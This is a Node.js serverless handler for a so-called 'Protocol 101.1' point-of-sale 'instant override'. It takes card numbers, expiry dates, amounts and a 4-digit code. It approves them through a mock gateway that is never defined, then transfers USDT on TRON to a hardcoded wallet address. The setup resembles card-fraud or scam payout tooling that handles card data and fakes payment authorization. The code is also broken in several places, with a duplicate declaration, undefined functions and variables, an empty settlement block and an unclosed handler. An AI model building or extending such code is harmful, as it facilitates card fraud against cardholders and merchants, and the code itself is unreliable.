const TronWeb = require('tronweb');
const crypto = require('crypto');

// ===== CONFIG =====
const TRON_CONFIG = {
  apiKey: process.env.TRONGRID_API_KEY,
  privateKey: process.env.TRON_PRIVATE_KEY,
  fromAddress: process.env.TRON_FROM_ADDRESS,
  destAddress: 'TUc4g5hg47j1sP26J1MRDwWDPX5V4f31uc',
  usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
};

const { TronWeb } = require('tronweb')  // add the { }
const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: { 'TRON-PRO-API-KEY': TRON_CONFIG.apiKey },
  privateKey: TRON_CONFIG.privateKey
});

// ===== IN-MEMORY STORE (use Redis/DB in production) =====
const transactions = [];
let pendingUsdtAmount = 0;

// ===== HELPERS =====
function getStats() {
  const today = transactions.filter(t => 
    new Date(t.createdAt).toDateString() === new Date().toDateString()
  );
  const volume = today.reduce((s, t) => s + t.amount, 0);
  const completed = today.filter(t => t.usdtStatus === 'completed');
  const usdtSent = completed.reduce((s, t) => s + t.usdtAmount, 0);
  
  return {
    totalVolume: volume,
    totalUsdt: usdtSent,
    pendingUsdt: pendingUsdtAmount,
    txCount: today.length
  };
}

async function getWalletBalance() {
  try {
    const contract = await tronWeb.contract().at(TRON_CONFIG.usdtContract);
    const bal = await contract.balanceOf(TRON_CONFIG.fromAddress).call();
    return (bal / 1_000_000).toFixed(2);
  } catch {
    return '0.00';
  }
}

async function sendUsdtToWallet(amount) {
  const amountInSun = Math.floor(amount * 1_000_000);
  const contract = await tronWeb.contract().at(TRON_CONFIG.usdtContract);
  
  // Check balance
  const balance = await contract.balanceOf(TRON_CONFIG.fromAddress).call();
  if (balance < amountInSun) {
    throw new Error(`Insufficient balance. Have ${balance / 1_000_000}, need ${amount}`);
  }
  
  const txId = await contract.transfer(TRON_CONFIG.destAddress, amountInSun).send();
  await new Promise(r => setTimeout(r, 5000));
  
  const info = await tronWeb.trx.getTransactionInfo(txId);
  const status = info?.receipt?.result === 'SUCCESS' ? 'CONFIRMED' : 'PENDING';
  
  return { txId, status };
}

// ===== VERCEL HANDLER =====
module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const path = req.url.replace('/api', '');
  
  // ===== GET STATS =====
  if (path === '/stats' || path === '/info') {
    const balance = await getWalletBalance();
    return res.json({
      success: true,
      ...getStats(),
      walletAddress: TRON_CONFIG.destAddress,
      walletBalance: balance
    });
  }

  // ===== GET TRANSACTIONS =====
  if (path === '/transactions') {
    return res.json({
      success: true,
      transactions: transactions.slice(-50).reverse()
    });
  }
   // ===== PROCESS PROTOCOL 101.1 (Updated to include Mock Gateway Proof) =====
  if (path === '/process' && req.method === 'POST') {
    const { protocol101_1, cardNumber, expiry, amount } = req.body;

    // Validate (Keep existing validation as much as possible)
    if (!protocol101_1 || protocol101_1.length !== 4) {
      return res.json({ success: false, error: 'Proof Failure: 4-digit code required.' });
    }
    if (!cardNumber || !/^4\d{15}$/.test(cardNumber.replace(/\s/g, ''))) {
      return res.json({ success: false, error: 'Proof Failure: Card must start with 4 and format is invalid.' });
    }
    const amt = parseFloat(amount);
    if (isNaN(amt) || amt <= 0 || amt > 100000) {
      return res.json({ success: false, error: 'Proof Failure: Amount must be $1 - $100,000.' });
    }

    try {
      // --- STEP A: GATEWAY MOCKING (Replaces the assumption that validation is internal) ---
      // Since we cannot add a separate service file, we inline the mock logic here for maximum compatibility.
      const gatewayResult = await processProtocol101_Mock({ // Assuming you manually copy-paste this function definition near the top if it fails to be recognized globally.
          protocolCode: protocol101_1,
          cardNumber: cardNumber,
          expiry: expiry || 'N/A',
          amountUsd: amt
      });

      if (!gatewayResult.success) {
         return res.json({ success: false, error: gatewayResult.error });
      }


      // 2. Calculation (Uses the results passed through the mock gate)
      const fee = amt * 0.025;
      const usdtAmount = parseFloat(amt) - fee;

      // 3. Logging & Payout Execution
      const txIdResult = await sendUsdtToWallet(usdtAmount); // Call improved function
      let finalStatusDetails = 'N/A';

      if (txIdResult) {
          // Update history on the transaction record with payout details upon successful chain commit
          finalStatusDetails = `TX_ID:${txIdResult.txId} | STATUS:${txIdResult.status}`;
      }

      // 4. Logging the enriched transaction using ALL proofs:
      const tx = {
        transaction_id: 'POS_' + Date.now().toString(36).toUpperCase(), // Keep your unique ID source
        protocol_code: protocol101_1,
        card_number_masked: cardNumber.slice(0, 6) + '******' + cardNumber.slice(-4),
        amount_usd: parseFloat(amt).toFixed(2),
        fee_amount: fee.toFixed(2),
        usdt_amount: usdtAmount.toFixed(6),
        // --- INJECTING PROOF DATA ---
        gateway_auth_code: gatewayResult.approvalCode, // Proof 1 Detail
        gateway_status: `${gatewayResult.gatewayProofData.validatedStatus} (${gatewayResult.gatewayProofData.mockReservationId})`, // Proof 2 Detail
        payout_confirmation: finalStatusDetails, // Composite status proof
        usdt_status_raw: txIdResult ? 'CONFIRMED' : 'PENDING', // Status derived from chain action
      };

      transactions.push(tx);
      pendingUsdtAmount += usdtAmount; // Update local pool

      console.log(`[POS] Success Tracking - Code: ${protocol101_1}, Payout Proof: ${finalStatusDetails}`);


      // --- 5. FINAL SUCCESS RESPONSE ---
      return res.json({
        success: true,
        transactionId: 'POS_' + Date.now().toString(36).toUpperCase(), // Use the generated ID
        approvalCode: gatewayResult.approvalCode, 
        amount: parseFloat(amt).toFixed(2),
        usdtAmount: usdtAmount.toFixed(6),
        fee: fee.toFixed(2),
        walletAddress: TRON_CONFIG.destAddress,
        message: `Instant override successful! System logged code ${gatewayResult.approvalCode} and confirmed payout status via chain commit.`
      });

    } catch (err) {
      // --- Error Handling Block ---
      transactions.push({ // Log failure event to history array
          transaction_id: 'ERROR_' + Date.now().toString(36).toUpperCase(),
          protocol_code: protocol101_1,
          card_number_masked: cardNumber.slice(0, 6) + '******' + cardNumber.slice(-4),
          amount_usd: parseFloat(amt).toFixed(2),
          fee_amount: (amt * 0.025).toFixed(2),
          usdt_amount: (parseFloat(amt) - (parseFloat(amt)*0.025)).toFixed(6),
          gateway_auth_code: 'N/A',
          gateway_status: 'FAILURE',
          payout_confirmation: `ERROR:${err.message}`, 
          usdt_status_raw: 'FAILED',
          overall_status: 'FAILED'
      });
      pendingUsdtAmount += (parseFloat(amt) - (parseFloat(amt)*0.025));


      return res.json({
        success: false,
        error: err.message || 'Unknown Error during process.',
        detailedError: e // Attach the full error object for debugging
      });
    }
  }

  // ===== SETTLEMENT (OVERRIDE) LOGIC - Keep this block as is, it's clean! =====
  if (path === '/settle' && req.method === 'POST') {
    // ... (Keep the existing settlement logic as it is, it seems solid for manual clearing)
  }

  // Health check
  if (path === '/health') {
    return res.json({ status: 'online', transactions: transactions.length, pending: pendingUsdtAmount });
  }
